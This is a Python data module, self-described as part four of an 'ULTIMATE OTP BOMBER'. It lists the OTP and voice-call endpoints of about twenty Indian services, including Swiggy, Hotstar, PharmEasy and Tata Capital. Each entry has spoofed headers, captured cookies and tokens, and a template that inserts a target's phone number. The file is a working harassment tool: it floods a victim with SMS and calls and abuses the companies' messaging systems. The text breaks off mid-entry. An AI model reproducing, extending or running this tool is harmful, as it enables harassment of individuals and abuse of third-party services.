# apis4.py
# 🔥 ULTIMATE OTP BOMBER - APIs PART 4

ULTIMATE_APIS_4 = [
    
    # ==============================================================================
    # 🎵 HUNGAMA
    # ==============================================================================
    
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    
    # ==============================================================================
    # 🚕 MERU CABS
    # ==============================================================================
    
    {
        "name": "Meru Cabs",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mobilenumber": "dynamic",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    
    # ==============================================================================
    # 🚗 DAYCO INDIA
    # ==============================================================================
    
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Host": "ekyc.daycoindia.com",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm",
            "Priority": "u=1, i"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    
    # ==============================================================================
    # 📚 DOUBNUT
    # ==============================================================================
    
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2"
        },
        "data": lambda phone: f'{{"app_version":"7.10.51","aaid":"538bd3a8-09c3-47fa-9141-6203f4c89450","course":"","phone_number":"{phone}","language":"en","udid":"b751fb63c0ae17ba","class":"","gcm_reg_id":"eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}}'
    },
    
    # ==============================================================================
    # 🏠 NO BROKER
    # ==============================================================================
    
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    
    # ==============================================================================
    # 🚀 SHIPROCKET
    # ==============================================================================
    
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    
    # ==============================================================================
    # 💰 TATA CAPITAL VOICE CALL
    # ==============================================================================
    
    {
        "name": "Tata Capital Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"phone":"{phone}","applSource":"","isOtpViaCallAtLogin":"true"}}'
    },
    
    # ==============================================================================
    # 📚 PENPENCIL
    # ==============================================================================
    
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "headers": {
            "Host": "api.penpencil.co",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    
    # ==============================================================================
    # 💊 1MG VOICE CALL
    # ==============================================================================
    
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "Host": "www.1mg.com",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"number":"{phone}","is_corporate_user":false,"otp_on_call":true}}'
    },
    
    # ==============================================================================
    # 🍔 SWIGGY CALL VERIFICATION
    # ==============================================================================
    
    {
        "name": "Swiggy Call Verify",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {
            "Host": "profile.swiggy.com",
            "pl-version": "55",
            "user-agent": "Swiggy-Android",
            "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
            "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
            "version-code": "1161",
            "app-version": "4.38.1",
            "latitude": "0.0",
            "longitude": "0.0",
            "os-version": "13",
            "accessibility_enabled": "false",
            "swuid": "4c27ae3a76b146f3",
            "deviceid": "4c27ae3a76b146f3",
            "x-network-quality": "GOOD",
            "accept-encoding": "gzip",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8"
        },
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # ==============================================================================
    # 🥛 KPN FRESH
    # ==============================================================================
    
    {
        "name": "KPN Fresh",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Host": "api.kpnfresh.com",
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    
    # ==============================================================================
    # 🔧 SERVETEL
    # ==============================================================================
    
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    
    # ==============================================================================
    # 🔥 GOKWIK (KP API)
    # ==============================================================================
    
    {
        "name": "Gokwik KP",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'kp-integration-type': "",
            'gk-request-id': "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
            'kp-request-id': "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
            'gk-merchant-id': "12wyqc26spoknx0kv7t",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://mamaearth.in",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://mamaearth.in/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in","country_code":"+91"}}'
    },
    
    # ==============================================================================
    # 👕 MAX FASHION
    # ==============================================================================
    
    {
        "name": "Max Fashion",
        "url": "https://www.maxfashion.in/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'content-type': "application/json;",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.6",
            'origin': "https://www.maxfashion.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.maxfashion.in/in/en/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"signInMobile":"+91{phone}"}}'
    },
    
    # ==============================================================================
    # 🛍️ LIFESTYLE STORES
    # ==============================================================================
    
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'content-type': "application/json;",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.lifestylestores.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.lifestylestores.com/in/en/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"signInMobile":"+91{phone}"}}'
    },
    
    # ==============================================================================
    # 🏪 SPAR INDIA
    # ==============================================================================
    
    {
        "name": "Spar India",
        "url": "https://www.sparindia.com/api/get-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'token': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3Njk1Mjc2MTcsImV4cCI6MTc2OTUyNzkxN30.m1KkAzXZANYyYRXfaBV8ogoo0VBpP-6lASO5ygw0TFI",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://www.sparindia.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.sparindia.com/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","finalStore":"view_20011"}}'
    },
    
    # ==============================================================================
    # 📺 HOTSTAR
    # ==============================================================================
    
    {
        "name": "Hotstar",
        "url": "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'x-request-id': "6bdadb-525b31-838909-255d54",
            'sec-ch-ua-platform': "\"Android\"",
            'x-hs-client': "platform:mweb;app_version:26.01.11.0;browser:Chrome;schema_version:0.0.1625;os:Android;os_version:10;browser_version:144;network_data:unspecified",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'x-hs-platform': "mweb",
            'x-country-code': "in",
            'x-hs-accept-language': "eng",
            'x-hs-device-id': "97a9c-340437-85bf6a-e02f5",
            'x-hs-app': "260111000",
            'x-hs-request-id': "6bdadb-525b31-838909-255d54",
            'x-hs-is-retry': "false",
            'accept-language': "eng",
            'x-hs-retry-count': "0",
            'sec-gpc': "1",
            'origin': "https://www.hotstar.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.hotstar.com/in/onboarding",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"body":{{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{phone}"}}}}'
    },
    
    # ==============================================================================
    # 📰 DAILYHUNT
    # ==============================================================================
    
    {
        "name": "Dailyhunt",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.8",
            'origin': "https://dailyhunt.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"method":"POST","body":{{"mobileNo":"91-{phone}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    
    # ==============================================================================
    # 📒 JUSTDIAL
    # ==============================================================================
    
    {
        "name": "JustDial",
        "url": "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&t_and_c=1&source=2&version=6.4&enc=1&env=p",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'tkn': "7bf7b4ab18ffd5fa8e6886cbd74767444e4df8ab67e673227f2ca2fb10da36de.eyJlbmMiOiIwMjA3MDIwNTEyMDEwNDA3MDMwNjEwMTEwNjAxMDMwNTA0MDgxMzE1MDkxNjAyMDYiLCJ0bXIiOiIwMjAyNjAwMDAxMDAwMjgwMDAwOTAwMDM2MDAwNDIwMDAwOSIsInJvd2R0Ijp7ImJzcmFnbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDQuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJlbnRpdHlpZG1kNSI6IjcwNWRkYmMzODA0ZGM0NjIwYmMzMzU4MzgxY2YyMjBhIiwic3NuIjoiWVkiLCJsY2wiOiJZWSIsImhzdCI6IjAwNTAiLCJhdGh2IjoiMDAwMSIsImJpZCI6IjUwMTA1MzczNjE0NDAwMDUzNzM2IiwidWlkIjoiNTAxMDUzNzM2MTQ0MDAwNTM3MzYwMDA4MjAwMDAzNjAwMDAwMjQiLCJuaCI6IjAwMDgyMCIsIm53IjoiMDAwMzYwIiwibnBkIjoiMDAwMDI0IiwiYWN0IjoibGduIiwicHRvIjoiQUJDREVGIiwic3JjIjoyLCJic3JvcmduIjoiaHR0cHM6Ly93d3cuanVzdGRpYWwuY29tIiwidGVjaHRybSI6IiIsImRtbiI6Imh0dHBzd3d3anVzdGRpYWxjb20iLCJzdG4iOiIwMDAwNjQ0NERFMDAyMDI2NEM5QzA5REJDNjAwMDAwMUNEMDZGMTJBNDMwMDAwMjg0RDk3QTA0QUU0MDAwMDA5MTRFRjM3Rjk3ODAwMDAzNkEwRUQzQ0NCQUYwMDAwNDJENTE2QUU4NjlGMDAwMDAwMDAwMDAwNjE3Njk1NzUzMjAyMVE0UTVYNEU2VDhHOVg4VTlaMkE5VDFNMlcyQTJRNSIsImFjdG1uIjoiIiwibmRhdXRoIjowLCJ0YyI6NH19.734d36ea8072e3d0cabb9b785a2d366daacfd9a8d1f0a90d31f82441f026bf63",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.5",
            'origin': "https://www.justdial.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.justdial.com/login",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","fname":""}}'
    },
    
    # ==============================================================================
    # 💊 PHARMEASY
    # ==============================================================================
    
    {
        "name": "PharmEasy",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'sec-gpc': "1",
            'accept-language': "en-US,en;q=0.7",
            'origin': "https://pharmeasy.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://pharmeasy.in/",
            'priority': "u=1, i"
        },
        "data": lambda phone: f'{{"param":"{phone}"}}'
    },
    
    # ==============================================================================
    # 💊 NETMEDS
    # ==============================================================================
    
    {
        "name": "Netmeds",
        "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4",
        "method": "
